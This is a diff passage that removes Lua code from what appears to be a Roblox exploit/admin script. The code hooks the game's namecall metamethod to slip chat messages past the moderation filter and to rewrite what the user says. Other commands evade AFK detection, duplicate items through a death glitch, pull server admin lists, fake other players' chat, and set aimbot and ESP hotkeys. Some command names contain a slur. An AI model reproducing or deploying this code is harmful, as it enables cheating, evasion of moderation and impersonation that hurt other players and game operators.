-				hathandle.Massless = true
-			end
-		end
-	end
-	local Anim = Instance.new("Animation")
-	Anim.AnimationId = "rbxassetid://74799600"
-	local play = cmdlp.Character.Humanoid:LoadAnimation(Anim)
-	while wait() do
-		for i,v in pairs(cmdlp.Character:GetChildren()) do
-			if v:IsA("Tool") then
-				v.Equipped:Connect(function(Mouse)
-					Mouse.Button1Down:Connect(function()
-						play:Play()
-						wait(1)
-						play:Stop()
-					end)
-				end)
-			end
-		end
-	end
-end
-
-function useCommand.sai()
-	opx("-","If you had sais on your waist you are now holding them")
-	for _, hat in pairs(cmdp.LocalPlayer.Character.Humanoid:GetAccessories()) do
-		if hat.Handle ~= nil then
-			if hat.Name == "Dual SaiAccessory" then
-				local tool = Instance.new("Tool", cmdp.LocalPlayer.Backpack)
-				tool.Name = cmdlp.Name.."'s Sai"
-				tool.Parent = cmdp.LocalPlayer.Character
-				tool.GripForward = Vector3.new(0.035, 0.743, 0.669)
-				tool.GripPos = Vector3.new(1.46, 0.89, -0.97)
-				tool.GripRight = Vector3.new(0.999, -0.026, -0.023)
-				tool.GripUp = Vector3.new(-0, -0.669, 0.743)
-				local hathandle = hat.Handle
-				hathandle:FindFirstChildOfClass("Weld"):Destroy()
-				hathandle.Parent = tool
-				hathandle.Massless = true
-			end
-		end
-	end
-	local Anim = Instance.new("Animation")
-	Anim.AnimationId = "rbxassetid://185824714"
-	local play = cmdlp.Character.Humanoid:LoadAnimation(Anim)
-	play:Play()
-end
-
-function useCommand.present()
-	opx("-","If you had a present you are now holding it")
-	for _, hat in pairs(cmdp.LocalPlayer.Character.Humanoid:GetAccessories()) do
-		if hat.Handle ~= nil then
-			local tool = Instance.new("Tool", cmdp.LocalPlayer.Backpack)
-			tool.Name = cmdp.LocalPlayer.Name.."s present"
-			tool.Parent = cmdp.LocalPlayer.Character
-			tool.GripForward = Vector3.new(0, 0, -1)
-			tool.GripPos = Vector3.new(-0, -0.54, 0.72)
-			tool.GripRight = Vector3.new(1, 0, 0)
-			tool.GripUp = Vector3.new(0, 1, 0)
-			local hathandle = hat.Handle
-			hathandle:FindFirstChildOfClass("Weld"):Destroy()
-			hathandle.Parent = tool
-			hathandle.Massless = true
-		end
-	end
-end
-
-function useCommand.boombox()
-	opx("-","If you had a boombox on your back you are now holding it")
-	for _, hat in pairs(cmdlp.Character.Humanoid:GetAccessories()) do
-		if hat.Handle ~= nil then
-			if hat.Name == "Boomblox Back Boombox" then
-				local tool = Instance.new("Tool", cmdlp.Backpack)
-				tool.Name = cmdlp.Name.."s boombox"
-				tool.Parent = cmdlp.Character
-				tool.GripForward = Vector3.new(0.935, 0.354, -0.03)
-				tool.GripPos = Vector3.new(1.36, -1.05, 0)
-				tool.GripRight = Vector3.new(0.031, 0.003, 1)
-				tool.GripUp = Vector3.new(-0.354, 0.935, 0.008)
-				local hathandle = hat.Handle
-				hathandle:FindFirstChildOfClass("Weld"):Destroy()
-				hathandle.Parent = tool
-				hathandle.Massless = true
-			end
-		end
-	end
-end
-
-function useCommand.gearhat()
-	for i,tool in pairs(cmdlp.Backpack:GetChildren()) do
-		if tool:IsA("Tool") then
-			tool.Parent = cmdlp.Backpack
-			tool.GripForward = Vector3.new(0, 1, 0)
-			tool.GripPos = Vector3.new(1.49, 1.45, -0.97)
-			tool.GripRight = Vector3.new(1, 0, 0)
-			tool.GripUp = Vector3.new(0, 0, 1)
-			tool.Parent = cmdlp.Character
-		end
-	end
-	opx("-","Your gears are now hats")
-end
-
-function useCommand.bypass()
-    if _G.oldhook or _G.soldhook or _G.ssoldhook or _G.sssoldhook or _G.smarthook then
-        opx("*", "Bypass is already enabled.")
-        return
-    end
-    _G.oldhook = mt.__namecall
-    setreadonly(mt, false)
-    mt.__namecall = newcclosure(function(event, ...)
-        if not checkcaller() and event.Name == "SayMessageRequest" and getnamecallmethod() == "FireServer" then
-            local args = {...}
-            local message = args[1]
-            local words = message:split(" ")
-            local c = {}
-            c[1] = "\219\166\219\138"
-            local messagetopass = ""
-            for i = 1, #words do
-                words[i] = words[i]:sub(1,1)..c[1]..words[i]:sub(2,#words[i])
-                messagetopass = messagetopass..words[i].."  "
-            end
-            return _G.oldhook(event, messagetopass, args[2])
-        end
-        return _G.oldhook(event, ...)
-    end)
-    setreadonly(mt, true)
-    opx("-", "Bypass enabled.")
-end
-
-function useCommand.clearcharacter()
-    opx("-","Cleared your characters appearance")
-    cmdlp:ClearCharacterAppearance()
-    cmdlp.Character.Head.face:Destroy()
-end
-
-function useCommand.antiwindowafk()
-    if not getconnections then
-        opx("*","Your executor does not support getconnections!")
-        return
-    end
-    for _,v in pairs(getconnections(game:GetService("UserInputService").WindowFocused)) do v:Disable() end
-    for _,v in pairs(getconnections(game:GetService("UserInputService").WindowFocusReleased)) do v:Disable() end
-    opx("-","You will no longer window focus afk")
-end
-
-function useCommand.unantiwindowafk()
-    if not getconnections then
-        opx("*","Your executor does not support getconnections!")
-        return
-    end
-    for _,v in pairs(getconnections(game:GetService("UserInputService").WindowFocused)) do v:Enable() end
-    for _,v in pairs(getconnections(game:GetService("UserInputService").WindowFocusReleased)) do v:Enable() end
-    opx("-","You will now window focus afk")
-end
-
-function useCommand.nilchatcmds()
-	if _G.soldhook or _G.ssoldhook or _G.oldhook or _G.sssoldhook or _G.smarthook then
-		opx("*", "Nil ChatCmds is already enabled.")
-		return
-	end
-	_G.soldhook = mt.__namecall
-	setreadonly(mt, false)
-	mt.__namecall = newcclosure(function(event, ...)
-		if not checkcaller() and event.Name == "SayMessageRequest" and getnamecallmethod() == "FireServer" then
-			local args = {...}
-			local message = args[1]
-			if message:sub(1,#prefix) == prefix or message:sub(1,1) == "." then
-				return require(cmdlp.PlayerScripts.ChatScript.ChatMain).MessagePosted:fire(message)
-			end
-		end
-		return _G.soldhook(event, ...)
-	end)
-	setreadonly(mt, true)
-	opx("-", "Nil ChatCmds enabled.")
-end
-
-function useCommand.smartchat()
-    if _G.soldhook or _G.ssoldhook or _G.oldhook or _G.sssoldhook or _G.smarthook then
-		opx("*", "Smart chat is already enabled.")
-		return
-    end
-    _G.smarthook = mt.__namecall
-	setreadonly(mt, false)
-	mt.__namecall = newcclosure(function(event, ...)
-		if not checkcaller() and event.Name == "SayMessageRequest" and getnamecallmethod() == "FireServer" then
-			local args = {...}
-			local message = args[1]
-			message = message:sub(1,1):upper()..message:sub(2,#message)
-			if message:sub(#message,#message) ~= "." then
-			    message = message.."."
-			end
-			return _G.smarthook(event, message, args[2])
-		end
-		return _G.smarthook(event, ...)
-	end)
-	setreadonly(mt, true)
-	opx("-", "Smart chat enabled.")
-end
-
-function useCommand.unsmartchat()
-	if not _G.smarthook then
-		opx("*", "Smart chat is not enabled.")
-		return
-	end
-	setreadonly(mt, false)
-	mt.__namecall = _G.smarthook
-	setreadonly(mt, true)
-	opx("-", "Smart chat disabled.")
-	_G.smarthook = nil
-end
-
-function useCommand.retardchat()
-	if _G.soldhook or _G.ssoldhook or _G.oldhook or _G.sssoldhook or _G.smarthook then
-		opx("*", "Retard chat is already enabled.")
-		return
-	end
-	local stringka = game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/others/unicode"):split(",")
-	_G.sssoldhook = mt.__namecall
-	setreadonly(mt, false)
-	mt.__namecall = newcclosure(function(event, ...)
-		if not checkcaller() and event.Name == "SayMessageRequest" and getnamecallmethod() == "FireServer" then
-			local args = {...}
-			local message = args[1]:gsub("l","w"):gsub("L","W"):gsub("r","w"):gsub("n","ny"):split(" ")
-			local messagefin = ""
-			for i,v in pairs(message) do
-				if i == 1 then
-					v = (v:sub(1,1).."-"):rep(math.random(1,2))..v:sub(2,#v)
-					messagefin = messagefin..v.." "
-				else
-					messagefin = messagefin..v.." "
-				end
-			end
-			messagefin = messagefin..stringka[math.random(1,#stringka)]
-			return _G.sssoldhook(event, messagefin, args[2])
-		end
-		return _G.sssoldhook(event, ...)
-	end)
-end
-
-function useCommand.unretardchat()
-	if not _G.sssoldhook then
-		opx("*", "Retard chat is not enabled.")
-		return
-	end
-	setreadonly(mt, false)
-	mt.__namecall = _G.sssoldhook
-	setreadonly(mt, true)
-	opx("-", "Retard chat disabled.")
-	_G.sssoldhook = nil
-end
-
-function useCommand.reverse()
-	if arguments[2] then
-			opx("-","Now Reversing credit to plaisoundz")
-			local reversesettings = {
-			delay = arguments[2];
-			}
-
-		repeat until game.Players.LocalPlayer.Character
-		local rp = game.Players.LocalPlayer.Character.HumanoidRootPart
-		local health = game.Players.LocalPlayer.Character.Humanoid.Health
-		local Table={rp.CFrame}
-		for i=1, #Table do
-			for count = 1, reversesettings.delay-1 do
-				game:GetService("RunService").RenderStepped:Wait()
-				table.insert(Table, rp.CFrame)
-			end
-
-			local hyro = Instance.new("BodyGyro")
-			hyro.Parent = rp
-			hyro.MaxTorque = Vector3.new(1000,1000,1000)
-			hyro.D = Vector3.new(0,0,0)
-  
-	  rp.CFrame = (rp.CFrame)
-			local number = reversesettings.delay+1
-			for count = 1, reversesettings.delay do
-				game:GetService("RunService").RenderStepped:Wait()
-				number = number-1
-				rp.CFrame = (Table[number])
-				hyro.CFrame = (Table[number])
-			end
-			for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
-			if v:IsA("BodyVelocity") or v:IsA("BodyGyro") or v:IsA("RocketPropulsion") or v:IsA("BodyThrust") or v:IsA("BodyAngularVelocity") or v:IsA("AngularVelocity") or v:IsA("BodyForce") or v:IsA("VectorForce") or v:IsA("LineForce") then
-				v:Destroy()
-			end
-		end
-		end
-	else
-		opx("*","2 arguments are required for this command!")
-	end
-end
-
-function useCommand.unbypass()
-	if not _G.oldhook then
-		opx("*", "Bypass is not enabled.")
-		return
-	end
-	setreadonly(mt, false)
-	mt.__namecall = _G.oldhook
-	setreadonly(mt, true)
-	opx("-", "Bypass disabled.")
-	_G.oldhook = nil
-end
-
-
-function useCommand.unnilchatcmds()
-	if not _G.soldhook then
-		opx("*", "Nil ChatCmds is not enabled.")
-		return
-	end
-	setreadonly(mt, false)
-	mt.__namecall = _G.soldhook
-	setreadonly(mt, true)
-	opx("-", "Nil ChatCmds disabled.")
-	_G.soldhook = nil
-end
-
-function useCommand.thirdperson()
-	opx("-","Third person enabled")
-	cmdlp.CameraMode = "Classic"
-end
-
-function useCommand.firstperson()
-	opx("-","First person enabled")
-	cmdlp.CameraMode = "LockFirstPerson"
-end
-
-function useCommand.xraycamera()
-	opx("-","X-Ray camera enabled")
-	SavedCamera = {Max = cmdlp.CameraMinZoomDistance, Min = cmdlp.CameraMaxZoomDistance}
-	cmdlp.CameraMinZoomDistance = math.huge - math.huge
-	cmdlp.CameraMaxZoomDistance = math.huge - math.huge    
-end
-
-function useCommand.unxraycamera()
-	opx("-","X-Ray camera disabled")
-	cmdlp.CameraMinZoomDistance = SavedCamera.Min
-	cmdlp.CameraMaxZoomDistance = SavedCamera.Max
-end
-
-function useCommand.randomizechat()
-	if _G.ssoldhook or _G.soldhook or _G.oldhook or _G.sssoldhook then
-		opx("*", "Randomize chat is already enabled.")
-		return
-	end
-	_G.ssoldhook = mt.__namecall
-	setreadonly(mt, false)
-	mt.__namecall = newcclosure(function(event, ...)
-		if not checkcaller() and event.Name == "SayMessageRequest" and getnamecallmethod() == "FireServer" then
-			local args = {...}
-			local message = args[1]
-			local x4 = ""
-			for i = 1,#message do
-				local x2 = math.random(1,#message)
-				local x3 = message:sub(x2,x2)
-				x4 = x4..x3
-			end
-			return _G.ssoldhook(event, x4, args[2])
-		end
-		return _G.ssoldhook(event, ...)
-	end)
-	setreadonly(mt, true)
-	opx("-", "Randomize chat enabled.")
-end
-
-function useCommand.unrandomizechat()
-	if not _G.ssoldhook then
-		opx("*", "Randomize chat is not enabled.")
-		return
-	end
-	setreadonly(mt, false)
-	mt.__namecall = _G.ssoldhook
-	setreadonly(mt, true)
-	opx("-", "Randomize chat disabled.")
-	_G.ssoldhook = nil
-end
-
-function useCommand.emote()
-	if arguments[2] then
-		if cmd15(cmdlp) then
-			animations = {
-				Agree = 4841397952;
-				Disagree = 4841401869;
-				["Power Blast"] = 4841403964;
-				Happy = 4841405708;
-				Sad = 4841407203;
-				["Bunny Hop"] = 4641985101;
-				["Peanut Butter Jelly Dance"] = 4406555273;
-				["Around Town"] = 3303391864;
-				["Top Rock"] = 3361276673;
-				["Jumping Wave"] = 4940564896;
-				["Keeping Time"] = 4555808220;
-				Fashionable = 3333331310;
-				Robot = 3338025566;
-				Twirl = 3334968680;
-				Jacks = 3338066331;
-				TPose = 3338010159;
-				Shy = 3337978742;
-				Monkey = 3333499508;
-				["Borock's Rage"] = 3236842542;
-				["Ud'zal's Summoning"] = 3303161675;
-				["Hype Dance"] = 3695333486;
-				Godlike = 3337994105;
-				Swoosh = 3361481910;
-				Sneaky = 3334424322;
-				["Side to Side"] = 3333136415;
-				Greatest = 3338042785;
-				Louder = 3338083565;
-				Celebrate = 3338097973;
-				Haha = 3337966527;
-				["Get Out"] = 3333272779;
-				Tree = 4049551434;
-				Fishing = 3334832150;
-				["Fast Hands"] = 4265701731;
-				Y = 4349285876;
-				Zombie = 4210116953;
-				["Baby Dance"] = 4265725525;
-				["Line Dance"] = 4049037604;
-				Dizzy = 3361426436;
-				Shuffle = 4349242221;
-				["Dorky Dance"] = 4212455378;
-				BodyBuilder = 3333387824;
-				Idol = 4101966434;
-				["Fancy Feet"] = 3333432454;
-				Curtsy = 4555816777;
-				["Air Dance"] = 4555782893;
-				["Chicken Dance"] = 4841399916;
-				Disagree = 4841401869;
-				Sleep = 4686925579;
-				["Hero Landing"] = 5104344710;
-				Confused = 4940561610;
-				Cower = 4940563117;
-				Tantrum = 5104341999;
-				Bored = 5230599789;
-				Beckon = 5230598276;
-				Hello = 3344650532;
-				Salute = 3333474484;
-				Stadium = 3338055167;
-				Tilt = 3334538554;
-				Point = 3344585679;
-				Shrug = 3334392772;
-				["High Wave"] = 5915690960;
-				Applaud = 5915693819;
-				Breakdance = 5915648917;
-				["Rock On"] = 5915714366;
-				Dolphin = 5918726674;
-				["Jumping Cheer"] = 5895324424;
-				Floss = 5917459365;
-				["Country Line Dance"] = 5915712534;
-				Panini = 5915713518;
-				Holiday = 5937558680;
-				Rodeo = 5918728267;
-				["Old Town Road"] = 5937560570;
-				["Rock Star - Royal Blood"] = 6533093212;
-				["Drum Master - Royal Blood"] = 6531483720;
-				["Drum Solo - Royal Blood"] = 6532839007;
-				["Rock Guitar - Royal Blood"] = 6532134724;
-				["Take Me Under - Zara Larsson"] = 6797890377;
-				["It Ain't My Fault - Zara Larsson"] = 6797891807;
-				["Hips Poppin' - Zara Larsson"] = 6797888062;
-				Samba = 6869766175;
-				["Cha Cha"] = 6862001787;
-				["Block Partier"] = 6862022283;
-				["Boxing Punch - KSI"] = 7202863182;
-				["Show Dem Wrist - KSI"] = 7198989668;
-				["Wake Up Call - KSI"] = 7199000883;
-				["Drummer Moves - Twenty One Pilots"] = 7422527690;
-				["On The Outside - Twenty One Pilots"] = 7422779536;
-				["Dancin' Shoes - Twenty One Pilots"] = 7404878500;
-				["Saturday Dance - Twenty One Pilots"] = 7422807549;
-				["Up and Down - Twenty One Pilots"] = 7422797678;
-				["Quiet Waves"] = 7465981288;
-				["Flowing Breeze"] = 7465946930;
-				["Swan Dance"] = 7465997989;
-			}
-			animationdebounce = false
-			cmdlp.Character.Animate.Disabled = true
-			for i,v in pairs(cmdlp.Character.Humanoid:GetPlayingAnimationTracks()) do
-				v:Stop()
-			end
-			function PlayAnim(id)
-				animationdebounce = true
-				local Anim = Instance.new("Animation")
-				Anim.AnimationId = "rbxassetid://"..id
-				local salute = cmdlp.Character.Humanoid:LoadAnimation(Anim)
-				salute.Name = "AP"
-				salute:Play()
-				salute.Stopped:Connect(function()
-					cmdlp.Character.Animate.Disabled = false
-					animationdebounce = false
-				end)
-			end
-			gotanim = false
-			lower = string.lower(arguments[2])
-			for i,v in pairs(animations) do
-				if lower == string.sub(string.lower(tostring(i)), 1, #lower) and gotanim == false then
-					gotanim = true
-					PlayAnim(v)
-				end
-			end
-			local function Moved()
-				if cmdlp.Character.Humanoid.MoveDirection ~= VectorZero and animationdebounce == true then
-					for i,v in pairs(cmdlp.Character.Humanoid:GetPlayingAnimationTracks()) do
-						v:Stop()
-					end
-				end
-			end
-			cmdlp.Character.Humanoid:GetPropertyChangedSignal("MoveDirection"):Connect(Moved)
-			opx("-","Now playing emote")
-		else
-			opx("*","R15 is needed for this command!")
-		end
-	else
-		opx("*","2 arguments are needed for this command!")
-	end
-end
-
-function useCommand.chatframe()
-	if arguments[2] then
-		target = findplr(arguments[2])
-		if target then
-			game:GetService("Chat"):Chat(target.Character.Head,getstring(3),Enum.ChatColor.White)
-			game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
-				Text = "["..target.Name.."]: "..getstring(3);
-				Color = Color3.fromRGB(255,255,255);
-				Font = Enum.Font.SourceSansBold;TextSize = 18
-			})
-			opx("-","Forced "..target.Name.." to say "..getstring(3))
-		else
-			opx("*","Player does not exist!")
-		end
-	else
-		opx("*","2 arguments are needed for this command!")
-	end
-end
-
-local fbc = false
-function useCommand.forcebubblechat()
-	fbc = true
-	opx("-","Started bubble chat")
-	if fbc == true then
-		cmdp.PlayerAdded:connect(function(plr)
-			plr.Chatted:connect(function(msg)
-				if fbc == true then
-					game:GetService("Chat"):Chat(plr.Character.Head,msg,Enum.ChatColor.White)
-				end
-			end)
-		end) 
-		for i,v in pairs(cmdp:GetPlayers()) do
-			v.Chatted:connect(function(msg)
-				if fbc == true then
-					game:GetService("Chat"):Chat(v.Character.Head,msg,Enum.ChatColor.White)
-				end
-			end)
-		end
-	end
-end
-
-function useCommand.unforcebubblechat()
-	fbc = false
-	opx("-","Stopped bubble chat")
-end
-
-local IESPenabled = false
-function useCommand.itemesp()
-	opx("-","IESP Enabled")
-	IESPenabled = true
-	for _,i in pairs(workspace:GetDescendants()) do
-		if i:IsA("BasePart") and i.Parent.ClassName ~= "Accessory" then
-			local pi = i.Name:lower()
-			local z = string.find(pi,"handle")
-			local z1 = string.find(pi,"tool")
-			local z2 = string.find(pi,"item")
-			if z ~= nil or z1 ~= nil or z2 ~= nil then
-				IESP(i)
-			end
-		end
-	end
-end
-
-function useCommand.unitemesp()
-	opx("-","IESP Disabled")
-	IESPenabled = false
-	for _,i in pairs(workspace:GetDescendants()) do
-		for a,v in pairs(cmdlp.PlayerGui:GetChildren()) do
-			if v.Name == i:GetFullName()..'_IESP' then
-				v:Destroy()
-			end
-		end
-	end
-end
-
-function useCommand.setdiscord()
-	if arguments[2] then
-		arguments[2] = arguments[2]:gsub('#',' ')
-		discordTag = arguments[2]
-		updatesaves()
-		opx("-","Set discord to "..arguments[2])
-	else
-		opx("*","2 arguments are needed for this command!")
-	end
-end
-
-function useCommand.saydiscord()
-	if arguments[2] == "cb" or arguments[2] == "copy" then
-		setclipboard(discordTag)
-	end
-	sayremote:FireServer(discordTag, "All")
-	opx("-","Said discord in chat")
-end
-
-function useCommand.removecustombodyparts()
-	if cmd6(cmdlp) then
-		opx("-","Removed all custom body parts")
-		for i,c in pairs(cmdlp.Character:GetChildren()) do
-			if c:IsA("CharacterMesh") then
-				c:Destroy()
-			end
-		end
-	else
-		opx("*","You need to be R6 for this command!")
-	end
-end
-
-function useCommand.insane()
-	if cmdlp.Character:FindFirstChild("Humanoid").RigType == Enum.HumanoidRigType.R6 then
-		opx("-","You are now insane")
-		local pc = cmdlp.Character
-		Spas = Instance.new("Animation")
-		Spas.AnimationId = "rbxassetid://33796059"
-		insane = pc.Humanoid:LoadAnimation(Spas)
-		insane:Play()
-		insane:AdjustSpeed(99)
-	else
-		opx("*","R6 is needed for this command")
-	end
-end
-
-function useCommand.hotkeyaimbot()
-	if arguments[2] then
-		hotkeyaimbot = arguments[2]
-		updatesaves()
-		opx("-","Hotkey set to "..arguments[2])
-	else
-		opx("*","A key is required")
-	end
-end
-
-function useCommand.hotkeyesp()
-	if arguments[2] then
-		hotkeyesp = arguments[2]
-		updatesaves()
-		opx("-","Hotkey set to "..arguments[2])
-	else
-		opx("*","A key is required")
-	end
-end
-
-function useCommand.admindetect()
-	Scrollingad:ClearAllChildren()
-	if cmdlp.PlayerGui:FindFirstChild("HDAdminGUIs") then
-		opx("-","HDADMIN found, make sure to run the command 'admins' in it")
-		adframe.Visible = true
-		CreateADLabel("","")
-		CreateADLabel("","")
-		for i,v in pairs(cmdrs.HDAdminClient.Signals.RetrieveServerRanks:InvokeServer()) do
-			CreateADLabel(v.Player.Name.." | HDADMIN")
-	 end
-		cmdp.PlayerAdded:Connect(function(JoinedPlayer)
-			for i,v in pairs(cmdrs.HDAdminClient.Signals.RetrieveServerRanks:InvokeServer()) do
-				if v.Player == JoinedPlayer then
-					CreateADLabel(v.Player.Name.." | HDADMIN")
-				end
-			end
-		end)
-	elseif workspace:FindFirstChild("Kohl's Admin Infinite") then
-		opx("-","KOHL'S found")
-		adframe.Visible = true
-		CreateADLabel("","")
-		CreateADLabel("","")
-		for i,v in pairs(cmdrs:GetDescendants()) do
-			if v.Name == "log" then
-				adminTable = v.Parent:FindFirstChildOfClass("StringValue")
-			end
-		end
-		local adminTableS = {{N = "", I = ""}}
-		adminTableS.N = adminTable.Value:split(" ")
-		for i,v in pairs(adminTableS.N) do
-			adminTableS.N[i] = adminTableS.N[i]:gsub("-","")
-			adminTableS.N[i] = adminTableS.N[i]:sub(0,#adminTableS.N[i]-2)
-			for _,n in pairs(cmdp:GetPlayers()) do 
-				vID = n.UserId
-				z = string.find(adminTableS.N[i],vID)
-				if z ~= nil then
-					CreateADLabel(n.Name,"Staff | KOHLS")
-				end
-			end
-		end 
-		cmdp.PlayerAdded:Connect(function(plr)
-			for i,v in pairs(cmdrs:GetDescendants()) do
-				if v.Name == "log" then
-					adminTable = v.Parent:FindFirstChildOfClass("StringValue")
-				end
-			end
-			local adminTableS = {{N = "", I = ""}}
-			adminTableS.N = adminTable.Value:split(" ")
-			for i,v in pairs(adminTableS.N) do
-				adminTableS.N[i] = adminTableS.N[i]:gsub("-","")
-				adminTableS.N[i] = adminTableS.N[i]:sub(0,#adminTableS.N[i]-2)
-				vID = plr.UserId
-				z = string.find(adminTableS.N[i],vID)
-				if z ~= nil then
-					CreateADLabel(plr.Name,"Staff | KOHLS")
-				end
-			end
-		end)
-	else
-		opx("*","Unable to detect an adminGUI")
-	end
-end
-
-function useCommand.futurelighting()
-	opx("-","Set lighting to future")
-	savedLight = gethiddenproperty(game.Lighting, "Technology")
-	sethiddenproperty(game.Lighting, "Technology", Enum.Technology.Future)
-end
-
-function useCommand.unfuturelighting()
-	opx("-","Set lighting back to normal")
-	sethiddenproperty(game.Lighting, "Technology", savedLight)
-end
-
-function useCommand.streamermode()
-	opx("-","Streamer Mode enabled")
-	for i,v in pairs(cmdp:GetChildren()) do
-		if v.Name ~= cmdlp.Name and v.Character and v.Character:FindFirstChild("Head") then 
-			local char = v.Character
-			local head = char:FindFirstChild('Head')
-			local m = Instance.new("Model", char) m.Name = ""
-			local cl = char.Head:Clone() cl.Parent = m 
-			local hum = Instance.new("Humanoid", m) 
-			hum.Name = "NameTag" 
-			hum.MaxHealth = v.Character.Humanoid.MaxHealth
-			wait()
-			hum.Health = v.Character.Humanoid.Health
-			cl.CanCollide = false
-			local weld = Instance.new("Weld", cl) weld.Part0 = cl weld.Part1 = char.Head
-			char.Head.Transparency = 1
-		end
-	end
-	for i,v in pairs(cmdp:GetChildren()) do
-		v.CharacterAdded:Connect(function(v)
-			wait(2)
-			local char = v
-			local head = char.Head
-			local m = Instance.new("Model", char) m.Name = ""
-			local cl = char.Head:Clone() cl.Parent = m 
-			local hum = Instance.new("Humanoid", m) 
-			hum.Name = "NameTag" 
-			hum.MaxHealth = char.Humanoid.MaxHealth
-			wait()
-			hum.Health = char.Humanoid.Health
-			cl.CanCollide = false
-			local weld = Instance.new("Weld", cl) weld.Part0 = cl weld.Part1 = char.Head
-			char.Head.Transparency = 1
-		end)
-	end 
-	cmdp.PlayerAdded:Connect(function(v)
-		wait(2)
-		local char = v.Character
-		local head = char.Head
-		local m = Instance.new("Model", char) m.Name = ""
-		local cl = char.Head:Clone() cl.Parent = m 
-		local hum = Instance.new("Humanoid", m) 
-		hum.Name = "NameTag" 
-		hum.MaxHealth = char.Humanoid.MaxHealth
-		wait()
-		hum.Health = char.Humanoid.Health
-		cl.CanCollide = false
-		local weld = Instance.new("Weld", cl) weld.Part0 = cl weld.Part1 = char.Head
-		char.Head.Transparency = 1
-	end)
-	local Chat = cmdlp.PlayerGui.Chat:WaitForChild("Frame").ChatChannelParentFrame["Frame_MessageLogDisplay"].Scroller
-	Chat.ChildAdded:Connect(function(fr)
-		if fr:IsA("Frame") then
-			local frg = fr.TextLabel.TextButton.Text
-			fr.TextLabel.TextButton.Text = ""
-		end
-	end)
-	local Players = game:GetService("CoreGui").RobloxGui.PlayerListMaster.OffsetFrame.PlayerScrollList.SizeOffsetFrame.ScrollingFrameContainer.ScrollingFrameClippingFrame.ScollingFrame.OffsetUndoFrame
-	for i,fr in pairs(Players:GetDescendants()) do
-		if fr:IsA("TextLabel") then
-			fr.Text = ""
-		end
-	end
-	Players.DescendantAdded:Connect(function(fr)
-		if fr:IsA("TextLabel") then
-			fr.Text = ""
-		end
-	end)
-end
-
-function useCommand.permflyspeed()
-	if cmdnum(arguments[2]) then
-		opx("-","Perm fly speed updated to "..arguments[2])
-		permflyspeed = arguments[2]
-		updatesaves()
-	else
-		opx("*","2 arguments are required for this command")
-	end
-end
-
-local Loopto = false
-function useCommand.loopgoto()
-	if arguments[2] then
-		target = findplr(arguments[2])
-		if target then
-			if target.Character and target.Character:FindFirstChild('Humanoid') then
-				Loopto = true
-				opx("-","Now LoopTping "..target.Name)
-				while Loopto do
-					cmdlp.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
-					wait()
-				end
-			end
-		else
-			opx("*","Player does not exist!")
-		end
-	else
-		opx("*","2 arguments are needed for this command!")
-	end
-end
-
-function useCommand.unloopgoto()
-	Loopto = false
-	opx("-","No longer LoopTping")
-end
-
-stopDupeMid = false
-function useCommand.dupegears()
-	if cmdnum(arguments[2]) then
-		local DroppedTools = {}
-		opx("-","Duping tools until it reaches "..arguments[2])
-		stopDupeMid = false
-		local savepos = cmdlp.Character.HumanoidRootPart.CFrame
-		cmdlp.Character.HumanoidRootPart.CFrame = CFrame.new(0,10000000,0)
-		wait(.2)
-		for i = 1,arguments[2] do
-			if stopDupeMid then break end
-			cmdlp.Character.HumanoidRootPart.CFrame = CFrame.new(0,10000000,0)
-			for i,a in pairs(cmdlp.Backpack:GetDescendants()) do
-				if a:IsA("Tool") then
-					a.Parent = cmdlp.Character
-					wait(.1)
-					a.Parent = workspace
-					table.insert(DroppedTools, a)
-				end
-			end
-			cmdlp.Character:BreakJoints()
-			cmdlp.CharacterAdded:wait()
-			cmdlp.Character:WaitForChild("HumanoidRootPart").CFrame = savepos
-			wait(.1)
-			if stopDupeMid then break end
-		end
-		for _,v in pairs(DroppedTools) do
-			firetouchinterestX(v.Handle)
-		end
-		cmdlp.Character.HumanoidRootPart.CFrame = savepos
-	else
-		opx("*","This command requires 2 arguments")
-	end
-end
-
-function useCommand.stopdupegears()
-	stopDupeMid = true
-	opx("-","Stopped dupe tools")
-end
-
-function useCommand.permwalkspeed()
-	if cmdnum(arguments[2]) then
-		opx("-","Perm walkspeed updated to "..arguments[2])
-		permwalkspeed = arguments[2]
-		updatesaves()
-	else
-		opx("*","2 arguments are required for this command")
-	end
-end
-
-function useCommand.permmaxslopeangle()
-	if cmdnum(arguments[2]) then
-		opx("-","Perm maxslopeangle updated to "..arguments[2])
-		permmaxsl = arguments[2]
-		updatesaves()
-	else
-		opx("*","2 arguments are required for this command")
-	end
-end
-
-function useCommand.permjumppower()
-	if cmdnum(arguments[2]) then
-		opx("-","Perm jumppower updated to "..arguments[2])
-		permjumppower = arguments[2]
-		updatesaves()
-	else
-		opx("*","2 arguments are required for this command")
-	end
-end
-
-function useCommand.permhipheight()
-	if cmdnum(arguments[2]) then
-		opx("-","Perm hipheight updated to "..arguments[2])
-		permhipheight = arguments[2]
-		updatesaves()
-	else
-		opx("*","2 arguments are required for this command")
-	end
-end
-
-function useCommand.permgravity()
-	if cmdnum(arguments[2]) then
-		opx("-","Perm gravity updated to "..arguments[2])
-		permgravity = arguments[2]
-		updatesaves()
-	else
-		opx("*","2 arguments are required for this command")
-	end
-end
-
-function useCommand.clearoutput()
-	output1.Text = "";output2.Text = "";output3.Text = "";output4.Text = "";output5.Text = "";output6.Text = "";output7.Text = "";output8.Text = "";output9.Text = ""
-end
-
-function useCommand.gotospawn()
-	opx("-","Teleported to spawn")
-	for i,v in pairs(workspace:GetDescendants()) do
-		if v:IsA("SpawnLocation") then
-			cmdlp.Character.HumanoidRootPart.CFrame = v.CFrame
-			break
-		end
-	end
-end
-
-function useCommand.gotobp()
-	if arguments[2] then
-		target = findplr(arguments[2])
-		if target then
-			game:GetService("TweenService"):Create(cmdlp.Character.HumanoidRootPart, TweenInfo.new(1, Enum.EasingStyle.Linear), {CFrame = target.Character.HumanoidRootPart.CFrame}):Play()
-			opx("-","Now bypass teleporting to "..target.Name)
-		else
-			opx("*","Player does not exist!")
-		end
-	else
-		opx("*","2 arguments are needed for this command!")
-	end
-end
-
-Muted = {}
-
-function useCommand.supermute()
-	opx("-","Super muted game")
-	mutealls = true
-	repeat wait()
-		for i,v in pairs(workspace:GetDescendants()) do
-			if v:IsA("Sound") then
-				v.Playing = false
-			end
-		end
-	until mutealls == false
-end
-
-function ReloadGui(plr)
-	arguments = {"unmute",plr}
-	useCommand[arguments[1]]()
-	useCommand["unsupermute"]()
-end
-
